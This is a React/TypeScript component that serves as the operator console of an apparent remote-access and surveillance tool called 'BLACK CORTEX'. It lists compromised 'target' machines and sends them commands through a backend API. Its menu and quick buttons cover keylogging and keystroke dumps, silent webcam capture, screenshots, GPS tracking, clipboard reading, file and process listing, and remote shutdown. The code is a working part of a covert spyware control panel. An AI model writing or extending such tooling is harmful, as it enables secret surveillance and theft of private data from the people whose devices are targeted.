import { useState, useRef, useEffect, useCallback } from 'react';
import { Terminal as TerminalIcon, ShieldAlert, Hash, Globe, ChevronRight, Zap } from 'lucide-react';
import { useDevices } from '../context/DeviceContext';
import { useSocket } from '../context/SocketContext';
import { apiFetch, API_BASE } from '../utils/api';

const Terminal = () => {
  const { devices, selectedDevice, setSelectedDeviceId } = useDevices();
  const { socket, isConnected } = useSocket();
  const [history, setHistory] = useState<string[]>([
    'BLACK CORTEX [Universal Control v1.0]',
    '(c) 2026 Department of Black Cortex. Root Access Granted.',
    '',
    'Secure Uplink: ESTABLISHED',
    'Type "help" for a list of control vectors.',
    ''
  ]);
  const [input, setInput] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const terminalEndRef = useRef<HTMLDivElement>(null);

  const scrollToBottom = () => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [history]);

  // Listen for command results via SocketIO
  useEffect(() => {
    if (!socket) return;

    const handleCommandResult = (data: { device_id: string; result: string; success: boolean }) => {
      if (selectedDevice && data.device_id === selectedDevice.id) {
        setHistory(prev => [
          ...prev,
          `[RESULT] ${data.success ? 'SUCCESS' : 'FAILED'}`,
          data.result,
          ''
        ]);
        setIsExecuting(false);
      }
    };

    socket.on('command_completed', handleCommandResult);

    return () => {
      socket.off('command_completed', handleCommandResult);
    };
  }, [socket, selectedDevice]);

  const commands: Record<string, string | string[]> = {
    'help': [
      'SYSTEM CONTROL:',
      '  devices      List all connected neural nodes',
      '  pwr_off      Shutdown target node immediately',
      '  reboot       Restart target system',
      '  lock         Lock user session',
      'SURVEILLANCE:',
      '  keylog_start Initialize neural keylogger',
      '  keylog_dump  Fetch intercepted keystrokes',
      '  cam_snap     Capture silent webcam frame',
      '  scr_grab     Take high-res screenshot',
      '  location     Get GPS coordinates',
      'CYBER VECTORS:',
      '  sys_info     Retrieve deep hardware profile',
      '  proc_list    Show all processes',
      '  net_stat     Show active network connections',
      '  file_list    List files in directory',
      '  message      Show message on target screen',
      '  browse       Open URL in browser',
      '  clipboard    Read clipboard contents',
      'MISC:',
      '  clear        Purge terminal buffer',
      '  help         Show this help'
    ],
    'clear': 'CLEAR_BUFFER',
  };

  const handleCommand = useCallback(async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!input.trim()) return;

    const cmd = input.toLowerCase().trim();
    const newHistory = [...history, `> ${input}`];
    setHistory(newHistory);
    setInput('');

    // Check local commands
    if (cmd === 'clear') {
      setHistory(['Buffer purged.']);
      return;
    }

    if (commands[cmd] && !Array.isArray(commands[cmd])) {
      setHistory([...newHistory, commands[cmd] as string]);
      return;
    }

    if (cmd === 'help') {
      setHistory([...newHistory, ...(commands.help as string[])]);
      return;
    }

    if (cmd === 'devices') {
      const list = ['CONNECTED NEURAL NODES:', ''];
      devices.forEach(d => {
        list.push(`  ${d.hostname.padEnd(20)} ${d.ip.padEnd(16)} ${d.status.toUpperCase()}`);
      });
      list.push('');
      setHistory([...newHistory, ...list]);
      return;
    }

    // Send command to backend
    if (!selectedDevice) {
      setHistory([...newHistory, 'ERROR: No device selected.']);
      return;
    }

    setIsExecuting(true);
    setHistory([...newHistory, 'EXECUTING...']);

    try {
      const result = await apiFetch('/api/command', {
        method: 'POST',
        body: JSON.stringify({
          device_id: selectedDevice.id,
          command: cmd,
        }),
      });

      setHistory(prev => {
        const filtered = prev.filter(l => l !== 'EXECUTING...');
        return [
          ...filtered,
          `Command queued. ID: ${(result.command_id || '').slice(0, 8)}...`,
          'Waiting for execution result...',
          ''
        ];
      });

      // If not connected via SocketIO, timeout after 5s
      if (!isConnected) {
        setTimeout(() => {
          setHistory(prev => [
            ...prev,
            '[RESULT] Command sent. Check device for output.',
            ''
          ]);
          setIsExecuting(false);
        }, 5000);
      }
    } catch (err: any) {
      setHistory(prev => {
        const filtered = prev.filter(l => l !== 'EXECUTING...');
        return [...filtered, `ERROR: ${err.message}`, ''];
      });
      setIsExecuting(false);
    }
  }, [input, history, selectedDevice, devices, isConnected]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Enter' && !e.shiftKey && document.activeElement?.tagName === 'INPUT') {
        handleCommand();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [handleCommand]);

  return (
    <div className="max-w-7xl mx-auto h-[calc(100vh-140px)] flex flex-col space-y-4 p-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-green-500/10 border border-green-500/30 rounded-lg">
             <TerminalIcon size={20} className="text-green-500" />
          </div>
          <h1 className="text-2xl font-bold font-orbitron tracking-tight text-white uppercase">
            Control <span className="text-green-500">Terminal</span>
          </h1>
        </div>
        <div className="flex gap-4 items-center">
           {/* Device selector */}
           <select
             className="bg-black/40 border border-green-500/30 text-green-400 px-3 py-1 rounded text-xs font-orbitron"
             value={selectedDevice?.id || ''}
             onChange={(e) => setSelectedDeviceId(e.target.value || null)}
           >
             <option value="">SELECT TARGET</option>
             {devices.map(d => (
               <option key={d.id} value={d.id}>{d.hostname}</option>
             ))}
           </select>
           <div className="flex items-center gap-2 px-3 py-1 bg-red-500/10 border border-red-500/30 rounded text-red-500 text-[10px] font-orbitron uppercase">
             <ShieldAlert size={12} />
             Level 5 Root Access
           </div>
           <div className="flex items-center gap-2 px-3 py-1 bg-green-500/10 border border-green-500/30 rounded text-green-500 text-[10px] font-orbitron uppercase">
             <Zap size={12} />
             {selectedDevice ? selectedDevice.hostname.slice(0, 8) : 'NO NODE'}
           </div>
        </div>
      </div>

      <div className="flex-1 glass-card border-green-500/10 flex flex-col overflow-hidden shadow-[inset_0_0_100px_rgba(0,0,0,0.8)]">
        {/* Terminal Content */}
        <div className="flex-1 overflow-y-auto p-8 font-mono-data text-sm text-green-400/80 custom-scrollbar bg-black/40">
          {history.map((line, i) => (
            <div key={i} className={`mb-1.5 ${
              line.startsWith('>') ? 'text-green-400 font-bold' : 
              line.includes('ERROR') || line.includes('FAILED') ? 'text-red-500' : 
              line.startsWith('  ') ? 'text-slate-500' : ''
            }`}>
               {line}
            </div>
          ))}
          {isExecuting && (
            <div className="text-yellow-400 animate-pulse">▌</div>
          )}
          <div ref={terminalEndRef} />
        </div>

        {/* Command Input Area */}
        <form onSubmit={handleCommand} className="p-5 bg-black/60 border-t border-white/5 flex items-center gap-4">
          <div className="text-green-500 font-bold flex items-center gap-2">
             <ChevronRight size={18} />
             <span className="text-[10px] uppercase font-orbitron text-green-500/50 tracking-widest">root@cortex:~$</span>
          </div>
          <input 
            type="text"
            autoFocus
            value={input}
            onChange={(e) => setInput(e.target.value)}
            disabled={isExecuting}
            className="flex-1 bg-transparent border-none outline-none text-green-400 font-mono-data placeholder-green-900 caret-green-500"
            placeholder={selectedDevice ? "Awaiting command vector..." : "Select a device first..."}
          />
          <div className="flex gap-4 text-[10px] font-orbitron text-slate-700 uppercase tracking-tighter">
             <div className="flex items-center gap-1">
               <Globe size={10} />
               {isConnected ? 'LIVE' : 'REST'}
             </div>
             <div className="flex items-center gap-1">
               <Hash size={10} />
               Encrypted
             </div>
          </div>
        </form>
      </div>

      {/* Quick Access Matrix */}
      <div className="flex flex-wrap gap-2">
         {['help', 'devices', 'sys_info', 'keylog_dump', 'scr_grab', 'clear'].map(q => (
           <button 
             key={q}
             onClick={() => setInput(q)}
             className="px-4 py-1.5 bg-green-500/5 border border-green-500/20 rounded-lg text-[9px] font-orbitron text-green-600 hover:text-green-400 hover:border-green-500/50 hover:bg-green-500/10 transition-all uppercase tracking-widest"
           >
             {q}
           </button>
         ))}
      </div>
    </div>
  );
};

export default Terminal;